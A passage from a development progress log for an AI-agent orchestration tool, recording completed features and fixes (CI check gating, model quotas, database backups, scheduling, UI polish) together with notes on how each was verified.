`"types"` field to `./dist/index.d.ts`, and a fresh checkout has no `dist/`
at all (gitignored) — this was masked in every local dev session so far
because `dist/` always already existed from some earlier build. Reproduced
locally by deleting every workspace's `dist/` and hitting the identical
failure. Fixed the root cause: the root `typecheck` script now builds
`@orc/types` → `@orc/adapters` → `@orc/engine` (mirroring the existing
`build` script's dependency order) before running the per-workspace `tsc`
checks — so `npm run typecheck` alone is correct on any fresh checkout, not
just under CI. Verified: reran the full sequence from a clean `dist`-less
state (typecheck → build → both test suites, all green), then confirmed the
actual GitHub Actions run on the PR went green via `gh pr checks --watch`.

F15 fixed: new opt-in per-project `ProjectConfig.requireGithubChecks` +
`githubChecksTimeoutMin` (integer 1–120, default 15). **Verified the real
`gh` CLI's behavior by hand before writing any code** (per the plan's
explicit instruction not to trust the paragraph's assumptions) using a
throwaway probe PR against this very repo — the actual semantics turned out
cleaner than assumed: with `--json bucket,state,name`, `gh pr checks`
**always exits 0** for pass/pending/fail alike (the real state lives in
each check's `bucket` field, not the exit code — confirmed `"pass"`,
`"pending"`, `"fail"` directly); the **one** case that still throws (exit 1)
even with `--json` is "no checks configured at all", which prints a literal
`no checks reported on the '<branch>' branch` message instead of any JSON.
New `GitService.waitForChecks(project, prNumber, timeoutMs, onPoll?)` in
`git-service.ts` polls every 15s on exactly that logic: parse the JSON
array, `"fail"`/`"cancel"` bucket → `"failed"`; no `"pending"` bucket left →
`"passed"`; the "no checks reported" message → `"none"`; any other
unexpected CLI error tolerated (keep polling, don't fail the task over one
bad poll) until `timeoutMs` elapses → `"timeout"`. `Orchestrator.executeTask`
consults it right before the existing `canAutoMerge` risk check (after
`syncBranchWithMain`, guarded by `project.config?.requireGithubChecks`):
`"passed"`/`"none"` fall through to the normal risk-based merge decision
unchanged; `"failed"`/`"timeout"` skip straight to the existing
`requestApproval` escalation (reusing the same `approve_merge`/`reject`
shape as the risky-change path) since there's nothing more for
`canAutoMerge` to add once GitHub's own CI has already failed or hung.
`bailIfStopRequested` is checked immediately after the wait returns, so a
Stop press during a multi-minute wait can't be overtaken by checks finishing
and auto-merging behind it. Investigated the plan's stuck-detector warning
directly in the code rather than assuming it applied: `STUCK_DETECTION`'s
actual watchdog timers (`maxRunTimer`/`idleTimer`) are scoped and cleared
entirely within `runAuthor`, so a wait during the merge phase can't trigger
an abort — but the Board's `TaskCard` heartbeat indicator (`apps/web/.../
TaskCard.tsx`) mirrors the same `idleMs` threshold purely cosmetically from
log timestamps, so a silent multi-minute wait would still make the card
misleadingly look "possibly stuck" to a human watching the Board. Emitting
an info log line on every poll (as the plan asked) keeps that heartbeat
honest regardless of which mechanism was actually at risk. New
`apps/web/src/components/ProjectConfigFields.tsx` checkbox + conditional
timeout-minutes input alongside F9's other per-project Advanced fields.
Verified: 5 new engine unit tests with a fake `GitService` covering all
four outcomes plus the Stop-during-wait case (31/31 engine tests green,
4/4 adapters); **also live-verified the real (non-fake) `GitServiceImpl.
waitForChecks` implementation** via a standalone script against real PRs in
this repo — PR #48 (real passed CI) → `"passed"`, PR #47 (merged before CI
existed, no checks) → `"none"`, and a throwaway broken PR → `"failed"` —
exercising the actual JSON-parsing/bucket-decision code, not just CLI
behavior in isolation. The `"timeout"` path is covered by the fake-GitService
unit test only (precise real-world timing control wasn't practical to
reproduce safely). `npm run typecheck`/`npm run build` green across all
workspaces.

F16 fixed: new optional `ModelConfig.quota: { windowHours, maxRuns?,
maxCostUsd? }` declares a subscription's rolling usage window (Claude Pro's
cap being the motivating case); `PUT /api/settings` rejects a quota with a
non-positive `windowHours`, neither `maxRuns` nor `maxCostUsd` set, or a
non-positive limit. New `repo.getModelUsageSince(db, model, sinceIso)`
counts `runs` rows (every attempt, not just terminal ones — a subscription
window cares about requests made) and sums `costs` rows for a model since a
timestamp, across ALL projects (mirroring `getModelMonthlyCost`'s
cross-project reasoning, just with a rolling window instead of a calendar
month). New `budget.ts` function `checkModelQuota(db, model, settings)`
computes the window's cutoff from `quota.windowHours` and returns a reason
once either limit is met. Wired into `EngineRunner.buildOrchestrator` as a
direct lambda (`checkModelQuota: (modelId) => checkModelQuota(this.db,
modelId, settings)`) — a deliberate deviation from the plan's literal
wording ("`EngineRunner.checkModelQuota(modelId)`"): no internal state is
needed (unlike F6's cooldown Map), so it mirrors `checkBudget`'s existing
direct-lambda wiring rather than adding a redundant wrapper method, the
same kind of simplification F9 made for its own `SchedulerDeps` field.
New `SchedulerDeps.checkModelQuota?` hook consulted at **both** places
`checkBudget` already is: the dispatch loop (skip-don't-fail, new
`quotaBlockedWarned` Set following the exact
budget/cooldown/capacity warn-once pattern including the `.clear()`/
`.delete()` calls) and the retry/attempt path (requeue-to-backlog,
mirroring `checkBudget`'s own retry-path shape exactly, including that it
is **not** warn-once there — matching how the existing budget check
behaves at that site too). New checkbox-adjacent three-input row (window
hours / max runs / max cost) in `ModelsEditor.tsx` per model. Verified: new
engine unit test proves the warn fires exactly once across several polls
while a *different* task keeps the loop alive (not just trivially once,
which the naive first draft of this test would have shown regardless of
the dedup logic — a plain single-task version couldn't distinguish "warned
once" from "the loop only ever runs one pass," since budget/cooldown/quota
blocks don't set the `blockedByCapacity` flag that keeps `start()`'s loop
polling, unlike F12/B18's capacity check) — 32/32 engine tests green (1
new). Server-side: a standalone script against a real in-memory SQLite DB
(seeded via the actual `repo.createProject`/`createTask`/`createRun`/
`createCost` functions, not raw SQL) confirmed the real `checkModelQuota` +
`getModelUsageSince` window math for all four cases the plan asked for —
runs-limit reached, cost-limit under then over, and no-quota-configured —
plus an explicit assertion that out-of-window rows are excluded from the
count. Also live-verified `PUT /api/settings`'s new validation against a
real running server: a quota with a window but no limit → 400 with a clear
message; a valid quota → 200 and round-trips; a negative `maxRuns` → 400.
`npm run typecheck`/`npm run build` green across all workspaces.

F17 fixed: new `packages/server/src/db/backup.ts` — `runBackup(db, dbPath,
backupDir, keep)` uses better-sqlite3's own online-backup API
(`db.backup(destPath)`, confirmed as a real `Promise`-returning method by
reading the installed v11.10.0's actual implementation in
`node_modules/better-sqlite3/lib/methods/backup.js` before writing any
code, per the plan's explicit instruction — it also revealed a real
constraint worth knowing: the destination *directory* must already exist
or `db.backup()` throws, so `runBackup` `mkdirSync`s it first). Filenames
are `hoopedorc-YYYY-MM-DD-HHmm.db`; prunes to the newest `keep` afterward
by `mtime`. Skips entirely (no directory even created) when `dbPath` is
literally `":memory:"` — the caller in `main()` passes
`ENV.mock ? ":memory:" : ENV.dbPath`, matching exactly what `setupDb()`
itself used to open the DB. Wired into `main()` right next to the existing
log-pruning code, same on-boot-plus-daily `setInterval(...).unref()`
pattern, wrapped in a `.catch()` that only logs a warning — a failed
backup must never crash the server. New `DB_BACKUP_DIR` (default:
`<dirname(dbPath)>/backups`, computed once in `config.ts` alongside
`dbPath` itself so the default doesn't need recomputing at call sites) and
`DB_BACKUP_KEEP` (default 7) env vars, added to `.env.example`. Verified
against the real implementation two ways: (1) a standalone script against
a real file-based `better-sqlite3` DB (via `initDb`, not a reimplementation)
covering all three acceptance scenarios — a real backup file appears
matching the exact filename pattern; pre-seeding 9 dummy older files then
backing up again prunes to exactly 7 with the newest (including the
just-created real backup) surviving; an in-memory DB backup is skipped
with no directory created at all; (2) booted the actual built server
(non-mock, a real file DB) fresh and confirmed via its own log line and a
real `sqlite3 .tables` read against the produced file that a genuine,
schema-intact backup was written on boot. `npm run typecheck`/
`npm run build` green across all workspaces; `npm test -w @orc/engine`
(32/32) and `-w @orc/adapters` (4/4) unaffected (no engine/adapter changes).

F18 fixed: new `docs/specs/sandbox.md` — goals/non-goals, the
authenticated-CLIs-in-a-container problem (leads with F10's Keychain
finding: Claude Code's login lives in the macOS Keychain, unreachable from
a Linux container, so `ANTHROPIC_API_KEY` — billed per-token via the
Console, not a subscription's flat rate — is the only container-compatible
path for Claude; `opencode`'s file-based auth and `gh`'s native `GH_TOKEN`
support are more container-friendly, `GH_TOKEN`/`GITHUB_TOKEN` support
confirmed directly via `gh help environment` before writing it down), the
worktree mount model (bind-mount exactly `task.worktreePath`, nothing else
from the host — closing the current gap that nothing actually enforces
"one task can only touch its own worktree" beyond convention), a network
allowlist policy (target-repo host, the assigned model's specific
provider endpoint, and — a real tension worth flagging — package-registry
access for gate scripts that install deps at run time, so "no network at
all" doesn't cleanly work for the gates stage), env sanitization as two
layers (S5's existing host-side `sanitizedEnv()` denylist, plus a stricter
container-side allowlist built from scratch rather than forwarded from the
host), why gates are the easier half to containerize first (no CLI-auth
problem at all — plain `npm`/`execFile` calls), and a three-phase rollout
(gates-only → agents opt-in per model, starting with `opencode`'s simpler
auth story → agents default-on). Linked from F13's plan entry and from
`README.md`'s Security section, per the acceptance criteria. **No
implementation** — F13 remains future work; this is design only.

F19 fixed (last item — **closes Part 3 and the entire productization
plan**): new `ProjectConfig.schedule` (`ProjectSchedule`) — deliberately
simple cron-style auto-start, not real cron syntax, matching the plan's own
"deliberately dumb" framing: `enabled` + `mode: "interval" | "daily"`,
where `"interval"` needs `intervalHours` (1–720) and `"daily"` needs `hour`
(0–23)/`minute` (0–59) on the server's local clock. Validated on
`PATCH /api/projects/:id` the same way F15/F16 validate their own
`ProjectConfig` additions. New pure `packages/server/src/scheduler.ts`
`isScheduleDue(schedule, lastRunAt, now)` — kept as a standalone,
DB-free function so the date math is testable without booting a server;
"interval" fires once `now - lastRunAt >= intervalHours`, or immediately if
never run; "daily" fires only during the exact HH:MM minute *and* only
once per calendar day (guards against firing every poll during that
minute, or twice if the server restarts within it). New top-level
`Project.lastScheduledRunAt` (a real DB column via the standard `ALTER
TABLE` migration, deliberately **not** part of the `config` JSON blob a
Settings-style save would round-trip wholesale) tracks when the scheduler
last actually kicked off a run — kept as its own field specifically so a
human editing the schedule in the Advanced accordion and the scheduler's
own background write can never race each other. A new `setInterval` in
`main()` (~60s — fine enough resolution for HH:MM precision) iterates
every project, calls the existing `EngineRunner.start()` — the exact same
call the UI's Start button makes, no new dispatch mechanism — and only
stamps `lastScheduledRunAt` on an actual successful kickoff (`engine.start()`
throwing, e.g. a manual dispatch is in flight, doesn't consume the
schedule slot, so the next ~60s check retries instead of silently losing
that cycle until the next full interval/day). New Advanced-accordion
controls (`ProjectConfigFields.tsx`) — enable checkbox, a mode select,
and the relevant inputs. Verified: a standalone script exercising the real
`isScheduleDue` directly covered 13 cases (disabled/undefined schedules,
interval under/at/over its window plus a never-run-yet immediate-due case
plus an invalid-zero-hours case, and daily's exact-minute/wrong-minute/
wrong-hour/already-fired-today/fired-yesterday/missing-config cases) — all
passed. Live-verified end-to-end against a real running server: invalid
schedule configs (missing `hour`, a bad `mode`, an out-of-range
`intervalHours`) all correctly 400; a valid daily schedule round-trips
through `PATCH`; and — the real integration point — a throwaway project
(pointed at a nonexistent repo URL and an isolated scratch directory, kept
deliberately separate from anything that could touch this actual repo or
spend real model cost) with an immediately-due interval schedule was
picked up by the real ~60s scheduler tick, logged `"scheduled start:
<name>"`, and had `lastScheduledRunAt` populated — confirming the
scheduler genuinely calls the production `engine.start()` path, not a
reimplementation. `npm run typecheck`/`npm run build` green across all
workspaces; `npm test -w @orc/engine` (32/32) and `-w @orc/adapters` (4/4)
unaffected (no engine/adapter changes).

**This closes out Phase 8 — every item in Parts 1, 2, and 3 of this plan
(S1-S6, B1-B19, F1-F19) is now done.**

### Phase 9 — Part 4: post-plan audit fixes + UX wave — ✅ DONE

| Item | Status | PR |
|---|---|---|
| A1 — concurrent 401s hang api() calls (TokenGate resolver clobbered) | ✅ done | [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57) |
| A2 — scheduled runs never showed status "running" / no WS broadcast | ✅ done | [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57) |
| A3 — daily schedules could silently skip a day (poll drift) | ✅ done | [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57) |
| A4 — CHANGELOG had no 0.2.0 / Phase 7–8 entries | ✅ done | [#58](https://github.com/IngeniousArtist/hoopedorc/pull/58) |
| A5 — USER_GUIDE didn't cover quota/schedules/checks-gate/backups | ✅ done | [#58](https://github.com/IngeniousArtist/hoopedorc/pull/58) |
| U1 — no global "action required" indicator in the nav | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U2 — full ProjectHeader repeats on every project page | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U3 — Board's 8 columns overflow with no affordance | ✅ done | [#60](https://github.com/IngeniousArtist/hoopedorc/pull/60) |
| U4 — switching tabs silently discards unsaved Settings edits | ✅ done | [#61](https://github.com/IngeniousArtist/hoopedorc/pull/61) |
| U5 — MissionControl elapsed label reads "42s ago elapsed" | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U6 — model-reassign dropdown on every kanban card | ✅ done | [#62](https://github.com/IngeniousArtist/hoopedorc/pull/62) |
| U7 — schedules invisible outside the Advanced accordion; disable loses times | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U8 — headline costs render as "$0.0000" | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U9 — "New Project" is a nav tab though it's an action | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U10 — dependency chips truncate with no way to see the full title | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |

A1–A3 were found by Fable's post-Phase-8 audit and fixed the same day (see
Part 4 below for the record); A4/A5 were fixed alongside Part 4 itself in
the docs PR that also restored this doc's accidentally-deleted "Part 1"
heading and overhauled the README. U1–U10 are the next implementation wave
— same workflow as every prior phase, work top-down. Split into two
batches (mirroring Phase 3's pattern): batch 1 (U1, U2, U5, U7, U8, U9 —
✅ done, PR #59; U10 needed no code change, already fixed) shipped the
lower-risk items; batch 2 (U3 — ✅ done, PR #60; U4 — ✅ done, PR #61; U6 —
✅ done, PR #62) shipped the remaining ones with more interaction-state
complexity: Board column collapse/dragover, cross-component Settings dirty
tracking, moving the model-reassign control. **This closes out the entire
U1–U10 UX wave and Part 4 of the plan.**

U3 (PR #60) fixed: `Board.tsx` now tracks `expandedEmpty` (a
`Set<TaskStatus>` of columns a click or a drag has explicitly opened) and
`dragOverStatus` (the column currently being dragged over, if any). A
column collapses to a `w-9` vertical strip — rotated label + a "0" count
badge via `[writing-mode:vertical-rl] rotate-180` — whenever it has zero
tasks *and* isn't in either of those two sets; a column with any tasks is
never collapsed, full stop, regardless of set membership (so a column that
was manually opened while empty and then received a card can't glitch back
into a collapsed state later just because the set still has its status).
Clicking a collapsed strip — or its expanded-but-still-empty header, which
toggles the same way — flips its membership in `expandedEmpty`; dragging
over a collapsed strip sets `dragOverStatus` to that column, which swaps it
to the full expanded `<section>` in the same spot (same drop handler,
already attached) so the drop completes normally, then clears
`dragOverStatus` on drop/dragleave. Deliberately did not reorder columns
(collapsed ones stay in their original `TASK_STATUSES` position) or add any
new drag-and-drop mechanism — this only decides which of the two existing
render branches (slim strip vs. full section) a column takes. Verified:
`npm run typecheck`/`npm run build` green across all workspaces; `npm test
-w @orc/engine` (32/32) and `-w @orc/adapters` (4/4) unaffected (no
engine/adapter/server changes). Live-verified against `npm run mock`'s own
seed (the exact scenario the acceptance criteria names): at a 1280px
viewport, all 8 columns render with zero horizontal scroll — Backlog,
Ready, In Progress, and In Review expanded per the seed's 4 non-empty
statuses, Changes Req./Blocked/Done/Failed collapsed to strips. Click-to-
expand and click-to-recollapse both confirmed on the Blocked strip. The
drag-onto-collapsed-column path needed care to verify properly: Chrome's
native mouse-drag simulation doesn't reliably fire real HTML5 `dragstart`/
`dragover`/`drop` events, so it was tested by dispatching genuine
`DragEvent`s with a shared `DataTransfer` directly at the DOM nodes
(`element.dispatchEvent(new DragEvent(...))`) — the same technique used for
automated HTML5 drag-and-drop testing generally, and it exercises the
app's real bound handlers, not a reimplementation. This caught a bug in the
*test script* itself on the first attempt (dispatching `drop` on a stale
reference to the now-unmounted collapsed `<button>`, since it had already
swapped to the expanded `<section>` on `dragover` — fixed by re-querying
the live element before the `drop` dispatch) and separately surfaced two
pre-existing, unrelated server rules while picking test fixtures: B5's PATCH
validation only allows a manual drag to requeue a task to `backlog` or
`ready` (every other status is engine-assigned, confirmed via
`packages/server/src/index.ts`'s `"PATCH can only requeue a task to
\"backlog\" or \"ready\""` 400), and a task that's `in_progress`/`in_review`
rejects any PATCH with 409 (must Stop it first) — neither is new behavior,
both were hit incidentally when the first two test picks (an in-progress
task, then a backlog→changes_requested attempt) 409'd/400'd for reasons
having nothing to do with collapse. The clean, unambiguous proof came from
emptying Backlog by moving its one task to Ready (a valid transition,
succeeded 200), confirming Backlog auto-collapsed, then dragging a Ready
task onto the now-collapsed Backlog strip and confirming a 200 PATCH plus
the card actually landing in the (now re-expanded) Backlog column.

U4 (PR #61) fixed: `Settings.tsx` already tracked its own `dirty` boolean
(set on every field mutation, cleared on save) — U4 just needed it exposed
before the component unmounts, since `App.tsx`'s
`{page === "settings" && <Settings />}` destroys it on tab switch. New
`onDirtyChange?: (dirty: boolean) => void` prop, reported via a
`useEffect(() => onDirtyChange?.(dirty), [dirty, onDirtyChange])` — a plain
prop-drilled callback into a `useRef` in `App.tsx` (not `Settings` module
state, since a ref update must never itself trigger a re-render of `App`).
New `navigate(next: Page)` in `App.tsx` wraps every reachable-from-Settings
`setPage` call (the `NAV` tab buttons and the top-row "+ New" button —
traced every other `setPage` call site in the file and confirmed none of
the others can fire while `page === "settings"`, e.g. the empty-state "New
Project" button only renders for `PROJECT_PAGES`, which excludes Settings):
`if (page === "settings" && settingsDirtyRef.current && !window.confirm(...))
return;` else `setPage(next)`. Also made the Save row `sticky bottom-0`
(previously just the last element of a long, tall form) so it — and the
"Unsaved changes" hint next to it — stay in view on any viewport height
without scrolling. Verified: `npm run typecheck`/`npm run build` green
across all workspaces; `npm test -w @orc/engine` (32/32) and `-w
@orc/adapters` (4/4) unaffected (no engine/adapter/server changes).
Live-verified against `npm run mock` — a real native `window.confirm`
dialog would hang the browser-automation session per its own tool
guidance, so rather than skip verification, `window.confirm` was
temporarily stubbed via script (a standard technique for testing code that
calls blocking dialogs) while real clicks/inputs still drove the UI: toggled
a model's role checkbox to dirty the form, clicked the Board nav tab with
`confirm` stubbed to return `false` — confirmed it was called with the
exact string `"Discard unsaved settings changes?"` and that Settings
stayed mounted with the edit intact; retried with `confirm` stubbed to
return `true` — confirmed it navigated to Board (Settings' own heading gone
from the DOM); saved the edit, then clicked Board again with `confirm`
stubbed to spy-only — confirmed it was **never called** and navigation
happened immediately (the "save → switch is silent" case). Also confirmed
visually at a real 1280×800 window: the Save button and "Unsaved changes"
hint are both visible pinned to the bottom of the viewport on the initial
Settings load, with no scrolling needed, even though the full form (Models,
Routing, Merge Policy, Risky Rules, Projects, Security, Budget, Browser
Notifications, Telegram) is far taller than 800px.

U6 (PR #62) fixed: `TaskCard.tsx` dropped its `<ModelSelect>` entirely
(along with the now-unused `onModelChange` prop and `ModelId` import) —
the card's existing static chip (previously the raw `task.assignedModel`
id, e.g. `"deepseek-pro"`) now resolves the display name via `models`
(`models.find((m) => m.id === task.assignedModel)?.displayName ??
task.assignedModel`), matching how MissionControl already shows its
active-agent chips. Reassignment moved to `TaskDrawer`'s Overview tab: a
new required `onModelChange: (m: ModelId) => void` prop, wired through the
same `ModelSelect` component TaskCard used to render, with the *exact*
same enable/disable rule TaskCard enforced
(`disabled={task.status === "in_progress" || task.status === "in_review"}`,
same `disabledReason` copy) — a straight move, not a reimplementation.
`Board.tsx` now passes `onModelChange` to `TaskDrawer` instead of each
`TaskCard`, reusing the same pre-existing `handleModelChange(taskId,
model)` handler unchanged. Verified: `npm run typecheck`/`npm run build`
green across all workspaces; `npm test -w @orc/engine` (32/32) and `-w
@orc/adapters` (4/4) unaffected (no engine/adapter/server changes).
Live-verified against `npm run mock`: cards across Backlog/Ready/In
Progress/In Review all show a plain chip with the friendly model name and
no dropdown at all; opened the drawer for a Ready (non-active) task and
reassigned it from "Deepseek v4 Pro" to "GLM 5.1" via the drawer's select —
confirmed both the drawer's own "Roles: …" caption updated and, without
closing the drawer, the *card itself* live-updated its chip to "GLM 5.1"
(no reload); opened the drawer for an in_progress task and confirmed via
direct DOM inspection (`select.disabled === true`) that the control is
genuinely disabled, showing the current model and the "Running — wait for
this attempt to finish to reassign" message, not just visually similar.

Batch 1 (PR #59) fixed: **U1** — new amber count badge on the
Notifications nav item (`App.tsx`) for notifications with
`requiresApproval` and no `respondedWith`; seeded once from
`GET /api/notifications` on mount, kept live off the same global
`notification` WS broadcast B15 already made reach every client regardless
of subscribed project (the handler now always upserts into a `notifications`
array — mirroring `Notifications.tsx`'s own WS reducer exactly — and only
conditionally fires the existing browser-notify call on `action_required`).
**U2** — `ProjectHeader` takes a `compact?: boolean` prop that skips the
budget editor and the Advanced accordion, rendering just the top row (name,
repo, status chip, schedule chip, Start/Pause/Stop); `App.tsx` passes
`compact={page !== "board"}`. **U5** — one-line fix in `MissionControl.tsx`:
strips the " ago" suffix off the reused `agoLabel()` output instead of
appending "elapsed" after it, so an active row reads "elapsed 2m 3s" instead
of "2m 3s ago elapsed" — `TaskCard.tsx`'s own `agoLabel` usage is untouched.
**U7** — new `formatSchedule()` helper renders the "⏱ daily 03:15" / "⏱
every 6h" chip on both ProjectHeader variants and the ProjectsView row;
separately, `projectConfigFromForm` no longer drops the whole `schedule`
object when the enable checkbox is off — it now emits
`{ enabled: false, ...times }` whenever the hour/minute or interval fields
are filled in, so disabling and saving no longer discards them (the
scheduler's `isScheduleDue` already checks `enabled` first, so a persisted
disabled schedule is inert). Live-verified the exact round-trip the bug
described: toggle off → save → reload the page → re-check "enabled" →
the same hour/minute reappear instead of blank inputs (confirmed via curl
that the server actually persisted `{enabled:false, hour:3, minute:15}`,
not an omitted field). **U8** — new shared `formatUsd()`
(`apps/web/src/lib/format.ts`): `>= $0.01` → 2 decimals, `> 0 and < $0.01`
→ 4 decimals, `0` → "$0.00"; applied only to the two headline spots the
plan named (CostView's "Total spend" tile, BoardSummary's "spent" line) —
per-task/per-run rows (CostView's "By task"/"By model", the avg-cost
caption) deliberately keep their existing 4-decimal `usd()` formatting.
**U9** — `new-project` removed from `App.tsx`'s `NAV` array (now 8 tabs);
a "+ New" button sits next to the project selector in the top row instead,
plus a visual divider between the project-scoped tabs (Board…Notifications)
and the global ones (Projects/Settings/Setup) — computed from
`PROJECT_PAGES` rather than a hardcoded index so the two lists can't drift
apart. **U10** — turned out to already be fixed: `TaskCard.tsx`'s
dependency chip has carried `title={dep.title}` since the F3/F4 era: no
code change, confirmed via a DOM inspection (`el.title`) since native OS
tooltips don't render in CDP screenshots.

All six live-verified together against one real (non-mock) server process,
seeded via the actual `repo.ts` functions (`createProject`/`createTask`/
`createCost`/`createNotification` — not raw SQL) into a scratch SQLite DB:
one project with an enabled daily schedule, a running task, a task blocked
on it (for U10's tooltip), and two notifications inserted *after* boot
specifically to dodge B10's boot-time `expireStaleApprovals` sweep (seeding
them before boot would have stamped them `expired_restart` before the badge
could ever see them as pending); a second project with real cost records
($1.23 + $0.0034) for U8's two precision tiers. `npm run typecheck` /
`npm run build` green across every workspace; `npm test -w @orc/engine`
(32/32) and `-w @orc/adapters` (4/4) unaffected — no engine/adapter code
touched this batch. One thing deliberately **not** live-verified: the
badge's WS-driven live decrement when a notification is actually responded
to. That requires a genuine in-flight engine approval (a real
`EngineRunner.pendingApprovals` resolver, private to the running server
process) — fabricating one safely was out of proportion for a UI-polish
batch, so this was reasoned from code instead: `respondNotification`'s
success path already broadcasts the updated notification globally (used and
verified since B15/F5), and the badge's handler is the same upsert-by-id
reducer `Notifications.tsx` has used and relied on since F5.

### Phase 10 — Part 5: post-UX-wave fixes + remote-QoL wave — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B20 — Projects-page "Pause" is an unconfirmed hard abort | ✅ done | [#64](https://github.com/IngeniousArtist/hoopedorc/pull/64) |
| S7 — API token written to server logs via the WS query param | ✅ done | [#65](https://github.com/IngeniousArtist/hoopedorc/pull/65) |
| B21 — Board drag-and-drop failures are silent | ✅ done | [#64](https://github.com/IngeniousArtist/hoopedorc/pull/64) |
| B22 — Schedule form can silently delete a saved schedule | ✅ done | [#66](https://github.com/IngeniousArtist/hoopedorc/pull/66) |
| B23 — `notifications` table grows unbounded | ✅ done | [#67](https://github.com/IngeniousArtist/hoopedorc/pull/67) |
| B24 — Browser-notification dead ends are silent | ✅ done | [#67](https://github.com/IngeniousArtist/hoopedorc/pull/67) |
| F20 — Remote setup docs: `tailscale serve` HTTPS + EC2 headless auth | ✅ done | [#69](https://github.com/IngeniousArtist/hoopedorc/pull/69) |
| F21 — Hash routing + deep links | ✅ done | [#70](https://github.com/IngeniousArtist/hoopedorc/pull/70) |
| F22 — Approval context (PR link + reasons) in the web UI | ✅ done | [#71](https://github.com/IngeniousArtist/hoopedorc/pull/71) |
| F23 — Global "Stop all" control | ✅ done | [#72](https://github.com/IngeniousArtist/hoopedorc/pull/72) |
| F24 — Update story: `scripts/update.sh` + version surfacing | ✅ done | [#73](https://github.com/IngeniousArtist/hoopedorc/pull/73) |
| U11 — No `beforeunload` guard while Settings is dirty | ✅ done | [#74](https://github.com/IngeniousArtist/hoopedorc/pull/74) |
| U12 — `agoLabel` has no hours unit | ✅ done | [#74](https://github.com/IngeniousArtist/hoopedorc/pull/74) |
| U13 — MissionControl "elapsed" resets on status transitions | ✅ done | [#74](https://github.com/IngeniousArtist/hoopedorc/pull/74) |
| U14 — Notifications page: pending approvals should sort first | ✅ done | [#74](https://github.com/IngeniousArtist/hoopedorc/pull/74) |
| F25 — Single shared WebSocket connection | ✅ done | [#75](https://github.com/IngeniousArtist/hoopedorc/pull/75) |
| F26 — PWA manifest | ✅ done | [#76](https://github.com/IngeniousArtist/hoopedorc/pull/76) |

Worked top-down in the suggested batches, mirroring Phases 3/9: (1) B20+B21;
(2) S7; (3) B22; (4) B23+B24 — the "fixes first" set, recorded above; (5) F20
(docs only); (6) F21; (7) F22; (8) F23; (9) F24; (10) U11–U14 together;
(11) F25; (12) F26. **This closes out Part 5 and Phase 10.**

F20–F26 notable finds/decisions (each fully live-verified against real
running processes/browsers — see each PR description for the specific
evidence):
- **F20** (docs only): `tailscale` isn't installed in this dev environment,
  so its exact invocation is written from official docs and explicitly
  marked "verify on your box" rather than asserted as tested — everything
  about the three CLI auth flows *was* verified against the actually
  installed tools. Found `claude setup-token` via `--help` inspection — a
  headless-friendly, subscription-billed (not pay-per-token) auth path
  worth knowing about that wasn't previously documented anywhere in this repo.
- **F21**: hash sync is a plain `useEffect` reacting to `(page,
  selectedProjectId)` rather than threading a hash-write through every
  `setPage` call site — the first write uses `replaceState` (no phantom
  back-entry for a fresh install), every later one `pushState`s. The
  Settings-dirty guard's cancel path explicitly re-pushes the hash back to
  the current page, since a `hashchange` (unlike a click) has already moved
  `location.hash` by the time the handler runs.
- **F22**: `EngineRunner.requestApproval` now computes the PR URL + latest
  validator reasons once and feeds both the persisted notification and the
  Telegram message from that one source. Mock seed gained a permanent
  pending-approval-with-context example, seeded *after* the boot-time
  `expireStaleApprovals` sweep (not inside `setupDb()`) — that sweep runs
  unconditionally on every boot and would otherwise stamp a freshly-seeded
  pending approval `expired_restart` before anyone saw it live.
- **F23**: `EngineRunner.stopAll` hard-aborts the autonomous loop *and*
  separately walks `manualRuns` for in-flight manual dispatches — pause()
  alone never touches that second, distinct execution path (B19). Writes
  one audit entry *per* affected project rather than a single global one,
  since `AuditEntry.projectId` is required and the Audit tab is per-project.
  Multi-simultaneous-project stopping was verified by code review only —
  reliably standing up two independently-registered real orchestrators
  wasn't practical to reproduce safely in this pass (each needs its own
  genuine Start, and a project with no tasks yet winds down its dispatch
  loop almost immediately).
- **F24**: found and fixed two real, independent bugs while wiring this up
  — root `package.json`'s `version` had drifted to `"0.1.0"` despite
  `CHANGELOG.md`/git tags already at `v0.2.0` (bumped to match, otherwise
  the new version-surfacing feature would report something false), and
  `scripts/update.sh`'s first draft threw `unbound variable` specifically
  on **macOS's default Bash 3.2** (`set -u` + empty-array expansion — fixed
  in 4.4+) — caught only by actually running the script end-to-end in an
  isolated scratch clone, not by `bash -n` alone.
- **U11–U14**: batched together as one PR (all small, independent UI
  fixes). U13's specific `in_progress → in_review` transition couldn't be
  live-reproduced in this environment — every real author attempt here
  fails authentication/network near-instantly, so tasks never reach the
  gates stage where that transition happens; verified by code review
  instead (the new `activeSince` tracking mirrors the already-proven
  `activity` heartbeat map exactly).
- **F25**: live-verified against the real **production build** specifically
  (not the Vite dev server) to avoid React StrictMode's dev-only
  double-invoke noise muddying the connection count — confirmed exactly
  one `/ws` request for the whole Board view (App+Board+MissionControl
  together) and exactly one reconnection after killing and restarting the
  server.
- **F26**: manifest + two PNG icons (a `blue-600` "H" monogram on
  `neutral-950`, matching the app's own existing palette) generated by hand
  via `zlib.deflateSync` + manual PNG chunk framing rather than adding an
  image-processing dependency for two static icons. Deliberately no service
  worker (out of scope for this item) — noted that Chrome's automatic
  install banner typically also wants one, so "Add to Home Screen" here may
  need the browser's manual menu action rather than an automatic prompt.

**This closes out Part 5 (Phase 10) — every item in Parts 1–5 of this plan
is now done.**

**"Fixes first" batch (B20–B24, S7) — ✅ DONE**, all four PRs merged;
`npm run typecheck`, `npm run build` green across all workspaces on every
merge; `npm test -w @orc/engine` (32/32) and `-w @orc/adapters` (4/4)
unaffected throughout (no engine/adapter changes in this batch — all
web/server). Every item was live-verified against a real running
process/browser, not just typechecked — see each PR's description for the
specific evidence. Notable finds/decisions:
- B20+B21 (PR #64): B20's fix was verified by stubbing `window.fetch` and
  `window.confirm` in a real browser session (not just reading the code) —
  confirmed Pause genuinely sends `{drain:true}` with no confirm dialog, and
